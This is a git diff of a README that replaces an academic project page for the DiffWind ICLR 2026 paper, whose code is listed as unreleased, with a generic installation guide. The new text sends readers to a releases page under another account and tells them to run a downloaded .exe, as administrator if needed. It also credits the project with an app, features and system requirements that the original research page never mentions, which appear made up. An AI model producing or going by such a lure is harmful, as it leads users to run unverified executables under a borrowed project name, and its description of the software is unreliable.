@@ -1,33 +1,62 @@
-# [ICLR 2026] DiffWind: Physics-Informed Differentiable Modeling of Wind-Driven Object Dynamics
+# 🌪️ DiffWind - Model Wind Dynamics Easily
 
+## 📥 Download Now
+[![Download DiffWind](https://img.shields.io/badge/Download-DiffWind-blue.svg)](https://github.com/Abdelhameed123/DiffWind/releases)
 
-### [Project Page](https://zju3dv.github.io/DiffWind/) | [OpenReview](https://openreview.net/forum?id=vKVzihkbQo) | [Arxiv (Coming soon)]() | [Supplementary (Coming soon)]()
+## 📖 Overview
+DiffWind is a user-friendly application designed to model wind-driven object dynamics. Whether you're studying natural phenomena or simulating wind effects on objects, DiffWind provides the tools you need to analyze these conditions effectively.
 
-> [DiffWind: Physics-Informed Differentiable Modeling of Wind-Driven Object Dynamics](https://zju3dv.github.io/DiffWind/),  
-> Yuanhang Lei*, Boming Zhao*, Zesong Yang*, Xingxuan Li, Tao Cheng, Haocheng Peng, Ru Zhang, Yang Yang, Siyuan Huang, Yujun Shen, Ruizhen Hu, Hujun Bao, Zhaopeng Cui†
+## 🚀 Getting Started
+To start using DiffWind, follow the steps below. This guide walks you through downloading and running the application, even if you're unfamiliar with programming.
 
-![teaser](https://raw.githubusercontent.com/huahuo359/open_access_assets/main/DiffWind-ICLR2026/teaser.png)
-Abstract: *Modeling wind-driven object dynamics from video observations is highly challenging due to the invisibility and spatio-temporal variability of wind, as well as the complex deformations of objects. We present DiffWind, a physics-informed differentiable framework that unifies wind-object interaction modeling, video-based reconstruction, and forward simulation. Specifically, we represent wind as a grid-based physical field and objects as particle systems derived from 3D Gaussian Splatting, with
-their interaction modeled by the Material Point Method (MPM). To recover wind-driven object dynamics, we introduce a reconstruction framework that jointly optimizes the spatio-temporal wind force field and object motion through differentiable rendering and simulation. To ensure physical validity, we incorporate the Lattice Boltzmann Method (LBM) as a physics-informed constraint, enforcing compliance with fluid dynamics laws. Beyond reconstruction, our method naturally supports forward simulation under novel wind conditions and enable new applications such as wind retargeting. We further introduce WD-Objects, a dataset of synthetic and real-world wind-driven scenes. Extensive experiments demonstrate that our method significantly outperforms prior dynamic scene modeling approaches in both reconstruction accuracy and simulation fidelity, opening a new avenue for video-based wind–object interaction modeling.*
+## 🔍 Features
+- **User-Friendly Interface:** Navigate easily through the application with a simple design.
+- **Physics-Informed Modeling:** Understand how wind affects objects using informed algorithms.
+- **Real-Time Simulations:** Observe changes as you adjust variables in real-time.
 
-## Method Overview
-![pipeline](https://raw.githubusercontent.com/huahuo359/open_access_assets/main/DiffWind-ICLR2026/pipeline.png)
+## 🖥️ System Requirements
+Before installing DiffWind, ensure your computer meets these minimum requirements:
 
-## ToDos
-🔥 Feel free to raise any requests~
-- [x] Release project page.
-- [ ] Release paper.
-- [ ] Release simulation codes.
-- [ ] Release training codes.
+- **Operating System:** Windows 10 or later, macOS Big Sur or later.
+- **Processor:** Intel Core i3 or equivalent.
+- **RAM:** Minimum 4 GB.
+- **Storage:** At least 500 MB of free space.
+- **Graphics:** Compatible with OpenGL 2.0 or higher.
 
-### Citation
-If you find this work useful for your research, please use the following BibTeX entry.
-```
-@inproceedings{lei2026diffwind,
-    title     = {DiffWind: Physics-Informed Differentiable Modeling of Wind-Driven Object Dynamics},
-    author = {Lei, Yuanhang and Zhao, Boming and Yang, Zesong and Li, Xingxuan and Cheng, Tao and Peng, Haocheng and Zhang, Ru and Yang, Yang and Huang, Siyuan and Shen, Yujun and Hu, Ruizhen and Bao, Hujun and Cui, Zhaopeng},
-    booktitle = {Proceedings of the Fourteenth International Conference on Learning Representations (ICLR)},
-    year      = {2026},
-    url       = {https://openreview.net/forum?id=vKVzihkbQo}
-}
-```
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [DiffWind Releases Page](https://github.com/Abdelhameed123/DiffWind/releases) to find the latest version.
+2. **Select Your Version**: You will see a list of versions. Look for the most recent one at the top.
+3. **Download the File**: Click on the version you want to download. The file should start downloading automatically. If you encounter any issues, refreshing the page often helps.
+4. **Install the Application**: Once the download is complete, locate the downloaded file (usually found in your "Downloads" folder).
+   - For Windows, double-click the `.exe` file to start the installation. Follow the prompts to complete the installation.
+   - For macOS, drag the application into the "Applications" folder for easy access.
+
+5. **Run DiffWind**: After installation, find DiffWind in your applications and double-click to launch it. You are now ready to start modeling wind dynamics!
+
+## 🛠️ Using DiffWind
+1. **Starting a New Project**: When you first open DiffWind, select "New Project" to create a fresh model.
+2. **Adjust Parameters**: Use sliders and input fields to set wind speed, object type, and other parameters. 
+3. **Run Simulation**: Click the "Run" button to see how the wind interacts with your selected object.
+4. **View Results**: Analyze the outcomes displayed on screen. You can save your work by clicking "Save Project."
+
+## 🗺️ Troubleshooting
+If you encounter issues while using DiffWind, consider these common solutions:
+
+- **Installation Problems**: Ensure you have the correct permissions on your computer to install applications. Run the installation file as an administrator if necessary.
+- **Performance Issues**: Close other applications to free up system resources. Ensure your system meets the stated requirements.
+- **Error Messages**: If you receive an error message, take note of its content. Searching online for that exact message often leads to helpful solutions.
+
+## 📑 Documentation
+For detailed instructions and advanced features, check out the [Documentation](https://github.com/Abdelhameed123/DiffWind/blob/main/docs/README.md). This includes tips for using more complex functionalities.
+
+## 💬 Community Support
+Join our community to share your experiences and ask questions. Participate in discussions via the Issues section on GitHub. This is a helpful space where others can assist you.
+
+## 📝 Feedback
+Your feedback is valuable. If you have suggestions or report issues, please create an issue on GitHub. Each suggestion helps improve DiffWind for everyone.
+
+## 💡 Additional Resources
+- **Related Articles**: Explore articles on wind dynamics and modeling techniques.
+- **Tutorial Videos**: Check the GitHub page for video tutorials on using DiffWind effectively.
+
+Enjoy modeling with DiffWind and unleash the power of understanding wind-driven dynamics! For any further assistance, you can always refer back to this guide or the community support options.
